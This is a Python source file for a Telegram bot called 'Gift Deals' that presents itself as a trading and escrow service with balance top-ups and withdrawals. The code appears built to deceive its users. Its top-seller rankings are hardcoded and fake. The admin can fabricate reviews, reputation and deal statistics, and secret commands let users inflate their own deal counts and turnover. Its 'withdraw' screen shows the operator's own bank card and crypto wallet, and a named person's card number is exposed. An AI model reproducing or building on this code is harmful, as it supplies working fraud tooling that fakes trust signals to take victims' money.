async def admin_decline(update, context):
    q = update.callback_query
    await q.answer("❌")
    if update.effective_user.id != ADMIN_ID:
        return
    deal_id = q.data[12:]
    db = load_db()
    d = db.get("deals", {}).get(deal_id, {})
    await q.edit_message_text(
        f"{E['cross']} <b>Не подтверждена.</b>\n📄 <code>{deal_id}</code>\n💰 {d.get('amount','—')} {d.get('currency','—')}",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Всё же пришла", callback_data=f"adm_confirm_{deal_id}")
        ]]))

# ===================== BALANCE =====================
async def show_balance_menu(update, context):
    await update.callback_query.edit_message_text(
        f"{E['money']} <b>Пополнение баланса\n\nВыберите способ:</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⭐️ Звёзды", callback_data="balance_stars")],
            [InlineKeyboardButton("🇷🇺 Рубли (ВТБ)", callback_data="balance_rub")],
            [InlineKeyboardButton("💎 TON / USDT", callback_data="balance_crypto")],
            [InlineKeyboardButton("◀️ Назад", callback_data="main_menu")],
        ]))

async def show_balance_info(update, context, method):
    uid = update.effective_user.id
    if method == "stars":
        text = f"{E['star']} <b>Пополнение звёздами\n\nМенеджер: {MANAGER_USERNAME}</b>"
    elif method == "rub":
        text = (f"{E['card']} <b>Пополнение рублями\n\n"
                f"Карта ВТБ:\n<code>89041751408</code>\nАлександр Ф.\n\n"
                f"После перевода скриншот менеджеру: {MANAGER_USERNAME}</b>")
    elif method == "crypto":
        text = (f"{E['diamond']} <b>Пополнение TON / USDT\n\n"
                f"Адрес TON:\n<code>{CRYPTO_ADDRESS}</code>\n\n"
                f"Ваш ID: <code>{uid}</code></b>")
    else:
        text = "<b>Неизвестный метод</b>"
    await update.callback_query.edit_message_text(
        text, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="menu_balance")]]))

# ===================== LANGUAGE =====================
async def show_lang_menu(update, context):
    buttons, row = [], []
    for code, name in LANGS.items():
        row.append(InlineKeyboardButton(name, callback_data=f"lang_{code}"))
        if len(row) == 2:
            buttons.append(row); row = []
    if row: buttons.append(row)
    buttons.append([InlineKeyboardButton("◀️ Назад", callback_data="main_menu")])
    await update.callback_query.edit_message_text(
        f"{E['globe']} <b>Выберите язык:</b>", parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(buttons))

async def set_language(update, context, lang):
    db = load_db()
    u = get_user(db, update.effective_user.id)
    u["lang"] = lang
    save_db(db)
    await update.callback_query.answer("Язык изменён!")
    await send_main_menu(update, context, edit=True)

# ===================== PROFILE =====================
async def show_profile(update, context):
    db = load_db()
    uid = update.effective_user.id
    user = get_user(db, uid)
    uname = update.effective_user.username or "—"
    status_line = f"\n🏷 {user['status']}" if user.get("status") else ""
    reviews = user.get("reviews", [])
    rv = ("\n\n<b>📝 Отзывы:</b>\n" + "\n".join(f"• {r}" for r in reviews[-5:])) if reviews else ""
    text = (
        f"{E['user']} <b>Профиль{status_line}\n\n"
        f"@{uname}\n"
        f"💰 Баланс: {user.get('balance',0)} RUB\n"
        f"📊 Сделок: {user.get('total_deals',0)}\n"
        f"✅ Успешных: {user.get('success_deals',0)}\n"
        f"💵 Оборот: {user.get('turnover',0)} RUB\n"
        f"⭐️ Репутация: {user.get('reputation',0)}</b>{rv}"
    )
    await update.callback_query.edit_message_text(
        text, parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Пополнить", callback_data="menu_balance"),
             InlineKeyboardButton("💸 Вывод", callback_data="withdraw")],
            [InlineKeyboardButton("◀️ Назад", callback_data="main_menu")],
        ]))

# ===================== TOP SELLERS =====================
async def show_top_sellers(update, context):
    TOP = [("@al***ndr",450,47),("@ie***ym",380,38),("@ma***ov",310,29),
           ("@kr***na",290,31),("@pe***ko",270,25),("@se***ev",240,22),
           ("@an***va",210,19),("@vi***or",190,17),("@dm***iy",170,15),("@ni***la",140,13)]
    medals = ["🥇","🥈","🥉"]+["🏅"]*7
    lines = [f"{E['trophy']} <b>Топ продавцов Gift Deals\n</b>"]
    for i,(u,a,d) in enumerate(TOP):
        lines.append(f"<b>{medals[i]} {i+1}. {u} — ${a} | {d} сделок</b>")
    lines.append(f"\n{E['fire']} <b>Создавай сделки!</b>")
    await update.callback_query.edit_message_text(
        "\n".join(lines), parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="main_menu")]]))

# ===================== WITHDRAW =====================
async def withdraw_handler(update, context):
    q = update.callback_query
    db = load_db()
    uid = update.effective_user.id
    user = get_user(db, uid)
    balance = user.get("balance", 0)
    uname = update.effective_user.username or str(uid)
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"💸 <b>Вывод</b>\n👤 @{uname} (<code>{uid}</code>)\n💰 {balance} RUB",
            parse_mode="HTML")
    except Exception:
        pass
    await q.edit_message_text(
        f"{E['money']} <b>Вывод средств\n\n💰 Ваш баланс: {balance} RUB\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Карта ВТБ:\n<code>89041751408 ВТБ — Александр Ф.</code>\n\n"
        f"💎 TON кошелёк:\n<code>{CRYPTO_ADDRESS}</code>\n\n"
        f"Укажите реквизиты менеджеру.</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 Менеджер", url="https://t.me/GiftDealsManager")],
            [InlineKeyboardButton("◀️ Назад", callback_data="menu_profile")],
        ]))

# ===================== ADMIN =====================
def admin_main_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👤 Управление пользователем", callback_data="adm_user")],
        [InlineKeyboardButton("📢 Баннер (фото/видео/текст)", callback_data="adm_banner")],
        [InlineKeyboardButton("📝 Описание меню", callback_data="adm_menu_desc")],
        [InlineKeyboardButton("📋 Список сделок", callback_data="adm_deals")],
    ])

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    context.user_data.clear()
    context.user_data["admin_mode"] = True
    await update.message.reply_text(
        f"{E['shield']} <b>Панель администратора</b>",
        parse_mode="HTML", reply_markup=admin_main_kb())

async def handle_admin_callback(update, context):
    q = update.callback_query
    data = q.data
    ud = context.user_data
    if update.effective_user.id != ADMIN_ID:
        return

    if data == "adm_user":
        ud["admin_step"] = "get_user"
        await q.edit_message_text("<b>Введите @юзернейм:</b>", parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="adm_back")]]))
        return
    if data == "adm_banner":
        ud["admin_step"] = "banner"
        await q.edit_message_text(
            "<b>Отправьте фото, видео или текст.\noff — удалить баннер.</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Отмена", callback_data="adm_back")]]))
        return
    if data == "adm_menu_desc":
        ud["admin_step"] = "menu_desc"
        await q.edit_message_text("<b>Введите новое описание меню:</b>", parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Отмена", callback_data="adm_back")]]))
        return
    if data == "adm_deals":
        db = load_db()
        deals = db.get("deals", {})
        if not deals:
            await q.edit_message_text("<b>Сделок нет.</b>", parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="adm_back")]]))
            return
        text = "<b>📋 Последние 10 сделок:</b>\n"
        for did, d in list(deals.items())[-10:]:
            text += f"\n<b>{did}</b> | {d.get('type')} | {d.get('amount')} {d.get('currency')} | {d.get('status')}"
        await q.edit_message_text(text, parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Назад", callback_data="adm_back")]]))
        return
    # User edit buttons
    action_map = {
        "adm_add_review": ("review", "Введите отзыв:"),
        "adm_set_deals": ("total_deals", "Введите количество сделок:"),
        "adm_set_success": ("success_deals", "Введите успешных сделок:"),
        "adm_set_turnover": ("turnover", "Введите оборот:"),
        "adm_set_rep": ("reputation", "Введите репутацию:"),
        "adm_set_status": ("status", "Введите статус:"),
    }
    if data in action_map:
        field, prompt = action_map[data]
        ud["adm_field"] = field
        ud["admin_step"] = "set_value"
        await q.edit_message_text(f"<b>{prompt}</b>", parse_mode="HTML")

async def on_admin_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ud = context.user_data
    if update.effective_user.id != ADMIN_ID:
        return
    if not ud.get("admin_mode"):
        return
    step = ud.get("admin_step")
    if not step:
        return
    text = update.message.text.strip() if update.message.text else ""
    db = load_db()
    ok_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛠 В панель", callback_data="adm_back")]])

    if step == "get_user":
        username = text.lstrip("@").lower()
        found = None
        for uid, u in db["users"].items():
            if u.get("username", "").lower() == username:
                found = uid; break
        if not found:
            await update.message.reply_text("<b>Не найден. Введите снова:</b>", parse_mode="HTML")
            return
        ud["adm_target"] = found
        u = db["users"][found]
        await update.message.reply_text(
            f"<b>@{u.get('username','—')} | Сделок: {u.get('total_deals',0)} | Реп: {u.get('reputation',0)}\nСтатус: {u.get('status','—')}</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📝 Отзыв", callback_data="adm_add_review")],
                [InlineKeyboardButton("🔢 Сделок", callback_data="adm_set_deals"),
                 InlineKeyboardButton("✅ Успешных", callback_data="adm_set_success")],
                [InlineKeyboardButton("💵 Оборот", callback_data="adm_set_turnover"),
                 InlineKeyboardButton("⭐️ Репутацию", callback_data="adm_set_rep")],
                [InlineKeyboardButton("🏷 Статус", callback_data="adm_set_status")],
                [InlineKeyboardButton("◀️ Назад", callback_data="adm_back")],
            ]))
        ud["admin_step"] = None
        return

    if step == "banner":
        if update.message.photo:
            db["banner_photo"] = update.message.photo[-1].file_id
            db["banner_video"] = None
            db["banner"] = update.message.caption or ""
            save_db(db)
            await update.message.reply_text(f"{E['check']} <b>Фото-баннер установлен!</b>", parse_mode="HTML", reply_markup=ok_kb)
        elif update.message.video:
            db["banner_video"] = update.message.video.file_id
            db["banner_photo"] = None
            db["banner"] = update.message.caption or ""
            save_db(db)
            await update.message.reply_text(f"{E['check']} <b>Видео-баннер установлен!</b>", parse_mode="HTML", reply_markup=ok_kb)
        elif text.lower() == "off":
            db["banner"] = db["banner_photo"] = db["banner_video"] = None
            save_db(db)
            await update.message.reply_text(f"{E['check']} <b>Баннер удалён!</b>", parse_mode="HTML", reply_markup=ok_kb)
        else:
            db["banner"] = text; db["banner_photo"] = db["banner_video"] = None
            save_db(db)
            await update.message.reply_text(f"{E['check']} <b>Баннер установлен!</b>", parse_mode="HTML", reply_markup=ok_kb)
        ud["admin_step"] = None
        return

    if step == "menu_desc":
        db["menu_description"] = text
        save_db(db)
        await update.message.reply_text(f"{E['check']} <b>Описание обновлено!</b>", parse_mode="HTML", reply_markup=ok_kb)
        ud["admin_step"] = None
        return

    if step == "set_value":
        field = ud.get("adm_field")
        target = ud.get("adm_target")
        if not field or not target:
            return
        u = db["users"].get(target, {})
        if field == "review":
            u.setdefault("reviews", []).append(text)
        elif field in ("total_deals","success_deals","turnover","reputation"):
            try: u[field] = int(text)
            except ValueError:
                await update.message.reply_text("<b>Введите число!</b>", parse_mode="HTML"); return
        else:
            u[field] = text
        db["users"][target] = u
        save_db(db)
        await update.message.reply_text(f"{E['check']} <b>Обновлено!</b>", parse_mode="HTML", reply_markup=ok_kb)
        ud["admin_step"] = None
        return

# ===================== SECRET COMMANDS =====================
async def neptune_team(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>Команды:\n\n🔹 /set_my_deals [число]\n🔹 /set_my_amount [сумма]</b>",
        parse_mode="HTML")

async def buy_deal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    args = context.args
    if not args:
        await update.message.reply_text("<b>Пример: /buy GD00001</b>", parse_mode="HTML"); return
    deal_id = args[0].upper()
    db = load_db()
    if deal_id not in db.get("deals", {}):
        await update.message.reply_text("<b>Не найдено.</b>", parse_mode="HTML"); return
    deal = db["deals"][deal_id]
    deal["status"] = "confirmed"
    s = deal.get("user_id")
    if s and s in db["users"]:
        db["users"][s]["success_deals"] = db["users"][s].get("success_deals",0)+1
        db["users"][s]["total_deals"] = db["users"][s].get("total_deals",0)+1
    save_db(db)
    await update.message.reply_text(f"{E['check']} <b>Сделка {deal_id} подтверждена!</b>", parse_mode="HTML")

async def set_my_deals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("<b>Пример: /set_my_deals 100</b>", parse_mode="HTML"); return
    db = load_db()
    u = get_user(db, str(update.effective_user.id))
    u["success_deals"] = u["total_deals"] = int(args[0])
    save_db(db)
    await update.message.reply_text(f"{E['check']} <b>Установлено!</b>", parse_mode="HTML")

async def set_my_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("<b>Пример: /set_my_amount 15000</b>", parse_mode="HTML"); return
    try: amount = int(args[0])
    except ValueError:
        await update.message.reply_text("<b>Введите число!</b>", parse_mode="HTML"); return
    db = load_db()
    u = get_user(db, str(update.effective_user.id))
    u["turnover"] = amount
    save_db(db)
    await update.message.reply_text(f"{E['check']} <b>Оборот: {amount} RUB</b>", parse_mode="HTML")

# ===================== MAIN =====================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("neptunteam", neptune_team))
    app.add_handler(CommandHandler("buy", buy_deal))
    app.add_handler(CommandHandler("set_my_deals", set_my_deals))
    app.add_handler(CommandHandler("set_my_amount", set_my_amount))

    # Single callback handler for everything
    app.add_handler(CallbackQueryHandler(on_callback))

    # Message handler — admin first, then deals
    async def message_router(update, context):
        uid = update.effective_user.id
        ud = context.user_data
        if uid == ADMIN_ID and ud.get("admin_mode") and ud.get("admin_step"):
            await on_admin_message(update, context)
        elif uid == ADMIN_ID and ud.get("admin_mode") and (update.message.photo or update.message.video):
            await on_admin_message(update, context)
        else:
            await on_message(update, context)

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, on_admin_message))

    print(f"Bot @{BOT_USERNAME} started!")
    app.run_polling()

if __name__ == "__main__":
    main()
